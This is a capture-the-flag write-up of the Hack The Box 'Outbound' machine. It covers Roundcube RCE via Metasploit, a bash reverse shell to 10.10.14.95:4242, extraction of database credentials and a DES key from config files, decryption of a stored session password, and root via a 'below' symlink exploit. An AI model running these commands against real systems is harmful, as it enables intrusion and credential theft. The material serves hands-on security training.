---
icon: linux
layout:
  width: wide
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: false
  tags:
    visible: true
---

# Outbound Machine Walk-through

<figure><img src="../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>

_Welcome! This write-up walks through the_ **Outbound** _machine on Hack The Box. My goal is simple: stay motivated, record what I learn, and explain each step so the techniques and concepts stick. Follow along, replicate the steps, and level up your skills._

### About Machine <a href="#cf61" id="cf61"></a>

**Outbound** is an easy-difficulty Linux machine with provided assumed breach credentials. The credentials provide access to a **Roundcube** instance, where the user can enumerate the version and utilize \[CVE-2025–49113]\(https://nvd.nist.gov/vuln/detail/CVE-2025-49113), which demonstrates post-authenticated remote code execution via PHP object deserialization. After initial access to the target, we enumerate the database and find a session for the Jacob user, which, when base64 decoded, provides an encrypted password. Using an internal tool called `decrypt.sh`, we can extract the plaintext value of the password, which allows access to Roundcube as Jacob. Jacob has two messages in his inbox: one provides him with a new, updated password for the system, and another informs him that they have been granted `sudo` privileges to monitor system resources with a utility called **below** which is vulnerable to \[CVE-2025–27591]\(https://nvd.nist.gov/vuln/detail/CVE-2025-27591) that is a flaw that creates logs within the `/var/log/below` directory with excessive permissions allowing attackers to perform symlink attacks under certain conditions. We symlink `/etc/passwd` to the `error_root.log` file and write our payload to the log file via parameter injection, thereby creating a new user with a UID of the root user.

### Machine Info <a href="#b728" id="b728"></a>

* Machine Name: Outbound
* Machine Type: Linux
* Difficulty: Easy
* Link: \[[https://app.hackthebox.com/machines/Outbound](https://app.hackthebox.com/machines/Outbound)]

As is common in real life pentests, you will start the Outbound box with credentials for the following account `tyler / LhKL1o9Nm3X2`

### Initial Scanning: <a href="#id-9a13" id="id-9a13"></a>

```bash
nmap -p- -A -sC -vv --min-rate 10000 10.10.11.77 -oN scan.txt

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://mail.outbound.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=8/18%OT=22%CT=1%CU=43838%PV=Y%DS=2%DC=T%G=Y%TM=68A2F80
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M
OS:552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%
OS:O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%
OS:DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=
OS:0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF
OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=
OS:%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%
OS:IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 3.311 days (since Fri Aug 15 07:54:40 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   67.96 ms 10.10.14.1
2   68.03 ms 10.10.11.77
```

We can see that here two port are open port 22 and 80 and also see that a Domain name is `mail.outbound.htb`.

Add `mail.outbound.htb` to our `/etc/hosts` file.

```bash
sudo echo "10.10.11.77 mail.outbound.htb" | sudo tee -a /etc/hosts
```

When we Browse the `http://mail.outbound.htb` we can see that a Roundcube Webmail login page will be open. So, in Machine information we give credentials. Now we can try to login using those credentials. `tyler / LhKL1o9Nm3X2`

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*IgRX1dZhke1liQgKzVEtAw.png" alt="" height="298" width="700"><figcaption></figcaption></figure>

After login and analyze the webmail we can see the version of the Roundcube Webmail 1.6.10 and search in google to find any vulnerability exists in this version. And we can found a RCE vulnerability [CVE-2025–49113](https://www.exploit-db.com/exploits/52324).

<figure><img src="https://miro.medium.com/v2/resize:fit:616/1*csAxxtivNiBjuRSkA5C5KA.png" alt="" height="516" width="616"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*WfP3ppU9zYpxk1_Qktdk5A.png" alt="" height="255" width="700"><figcaption></figcaption></figure>

We can try to exploit the vulnerability using metasploit freamework. Run Following commands to exploit:

```bash
msfconsole
msf6 > search Roundcube 1.6.10
msf6 > use exploit/multi/http/roundcube_auth_rce_cve_2025_49113
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set LHOST 10.10.14.95
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set RHOST mail.outbound.htb
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set USERNAME tyler
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set PASSWORD LhKL1o9Nm3X2
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > exploit
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*Vh4Oddi-2KhL7Ry5D1OViQ.png" alt="" height="236" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*9x_f_PlZglj9k0B87P5nMg.png" alt="" height="132" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*-4yxECRohuni8O7U4gqAzg.png" alt="" height="365" width="700"><figcaption></figcaption></figure>

And we successfully get shell. But we don’t have stable shell, we need to a stable shell.\
So, we run `nc` in another terminal to get reverse shell connection:

```bash
rlwrap -cAr nc -lnvp 4242
```

And then run reverse shell payload in metasploit session:

```bash
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.95/4242 0>&1'
```

And we get a stable reverse shell connection.

<figure><img src="https://miro.medium.com/v2/resize:fit:537/1*l1qkEIVtxkTypjroeWXpFA.png" alt="" height="100" width="537"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:667/1*8BGE0RrQ8HHoX-r3rolqZg.png" alt="" height="303" width="667"><figcaption></figcaption></figure>

Now we can see in /home directory that others three user accounts called: jacob, tyler and mel. We want any of this user’s shell.

Now we can try to get tyler shell by using given credential.

```
www-data@mail:/$ su tyler
su tyler
Password: LhKL1o9Nm3X2
```

We get tyler shell but not stable. we need to a stable shell.\
So, we run the following command to get stable shell

```
/bin/bash -i
```

And then press `CTRL+z` --> Enter command:

```
stty raw -echo; fg
export TERM=xterm
```

And we get Stable shell.

<figure><img src="https://miro.medium.com/v2/resize:fit:693/1*LEpOTr7nqfwgJ2_tJvjuoQ.png" alt="" height="366" width="693"><figcaption></figcaption></figure>

After many research we found a password and DES\_key from `/var/www/html/roundcube/config/config.inc.php` file.

```bash
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*9YYLHsCXC4X8q2qx0oo5oA.png" alt="" height="455" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:632/1*WQGrmL5lK_avkWXrgib4Nw.png" alt="" height="106" width="632"><figcaption></figcaption></figure>

Now try to connect with mysql sql server by using `roundcube:RCDBPass2025` credential.

After connecting with sql we can see many tables but notice some interesting tables called users, session, contacts, system, filestore.

```bash
mysql -u roundcube -pRCDBPass2025 -h localhost roundcube
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*FTChVcGuO-TVplPVcYXW6Q.png" alt="" height="323" width="700"><figcaption></figcaption></figure>

We can try to extract users tables contents but we can’t see any interesting information.

```bash
mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e 'use roundcube;select * from users;' -E
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*h5gX7oUkgN-NvvZiJJWr9w.png" alt="" height="329" width="700"><figcaption></figcaption></figure>

Now we check the session table. And we found something interesting hash.

```bash
mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e 'use roundcube;select * from session;' -E
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*LGjEkDgZaH9j33shGq8Lbg.png" alt="" height="177" width="700"><figcaption></figcaption></figure>

Now try to decrypt the hash by using [Cybercafe](https://gchq.github.io/CyberChef/). And we found another chipertext password and auth\_secret hash.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*OQkNkKkh3qNxQMjKGre2KQ.png" alt="" height="277" width="700"><figcaption></figcaption></figure>

In the previous `config.inc.php` we found one `des_key` and, session One was also revealed. `auth_secret` After the information was collected, it was found that the use `Triple DES`.

Now we try to decrypt the hash by using DES\_Key `rcmail-!24ByteDESkey*Str`.

1. Decrypt Password hash `L7Rv00A8TuwJAr67kITxxcSgnIk25Am/` by using From Base64 and To Hex Decryption Algo. The Result is:

```
2f b4 6f d3 40 3c 4e ec 09 02 be bb 90 84 f1 c5 c4 a0 9c 89 36 e4 09 bf
```

And copy the first 8-bytes for later use, which is this: `2fb46fd3403c4eec`

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*HhAs1MkbV23EkUJFoO72sQ.png" alt="" height="251" width="700"><figcaption></figcaption></figure>

2\. Decrypt the ciphertext `0902bebb9084f1c5c4a09c8936e409bf` (which is given by the previously given last 16-byte hex code) by using DES\_key and priviously given 8-bytes hex code. And we found the result: `595mO8DmwGeD`

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*8LPZ1O2IXnRS7HIC4SdEuA.png" alt="" height="234" width="700"><figcaption></figcaption></figure>

Now try to switch the user jacob user by using `595mO8DmwGeD` password, and we successfully switch the account.

<figure><img src="https://miro.medium.com/v2/resize:fit:667/1*nuWuQ1R30JtRAocKG3vCVw.png" alt="" height="170" width="667"><figcaption></figcaption></figure>

After many research we found a password `gY4Wr3a1evp4` from `/home/jacob/mail/INBOX/jacob` file.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*xKzxarVvwmdYuOUTg9wKNg.png" alt="" height="439" width="700"><figcaption></figcaption></figure>

Now try to login ssh using this password. and finaly we get a ssh connection and User flag🎉.

<figure><img src="https://miro.medium.com/v2/resize:fit:609/1*7eRZmouP1jFmymf0IFwhcQ.png" alt="" height="268" width="609"><figcaption></figcaption></figure>

Now for PrivEsc, we check the Sudo priviledge and we found this:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*HuSiusYnmUy_mZ1k5iiARw.png" alt="" height="96" width="700"><figcaption></figcaption></figure>

After many research we found this [CVE-2025–27591](https://nvd.nist.gov/vuln/detail/CVE-2025-27591) and [PoC](https://github.com/BridgerAlderson/CVE-2025-27591-PoC/blob/main/README.md)

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*XJZd9vu60GAd-K_2Njxc4w.png" alt="" height="286" width="700"><figcaption></figcaption></figure>

Now try to exploit.

Create a new file called `exploit.py` in our home directory and write the entire code which is given in the PoC and run the code and boom we get root shell and root flag successfully💥.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*9ya0YTU8LDGi-7rZi3F5ag.png" alt="" height="344" width="700"><figcaption></figcaption></figure>

***

> _I hope you enjoyed this writeup! Happy Hacking :)_
>
> _Follow to me on Medium and be sure to turn on email notifications so you never miss out on my latest informative posts._

### Follow me on below Social Media: <a href="#id-1106" id="id-1106"></a>

1. _**LinkedIn:**_ [_**Subhadip Sardar**_](http://linkedin.com/in/subhadip-sardar)
2. _**Twitter | X :**_ [_**@Mr\_SubhaDip03**_](https://x.com/Mr_SubhaDip03)
3. _**GitHub :**_ [_**SubhaDip003**_](https://github.com/SubhaDip003)
4. _**Check My TryHackMe Profile :**_ [_**TryHackMe | SubhaDip**_](https://tryhackme.com/r/p/SubhaDip)
5. _**Check My HackTheBox Profile:**_ [_**Hack The Box | SubhaDip03**_](https://app.hackthebox.com/profile/1658126)
